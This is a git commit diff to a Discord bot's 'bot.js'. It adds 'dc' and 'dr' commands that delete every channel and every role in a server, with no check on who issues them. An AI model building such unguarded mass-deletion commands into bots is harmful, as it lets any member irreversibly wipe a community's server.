075a4fa23162701147264b063ab6c206aba6acee
zoma4 <45948124+zoma4@users.noreply.github.com>
2019-01-30 18:37:20 +0200

    Update bot.js

--- bot.js
+++ bot.js
@@ -1864,5 +1864,20 @@ console.error(err);
  
 })
  
+client.on('message', message => {
+ if(message.content.split(' ')[0] == prefix + 'dc') { 
+ if (!message.channel.guild) return;
+ message.guild.channels.forEach(m => {
+ m.delete();
+ });
+ }
+ if(message.content.split(' ')[0] == prefix + 'dr') { // delete all roles
+ if (!message.channel.guild) return;
+ message.guild.roles.forEach(m => {
+ m.delete();
+ });
+ message.reply("`تم حذف جميع الرتب بنجاح`")
+ }
+ });
  
 client.login(process.env.BOT_TOKEN);
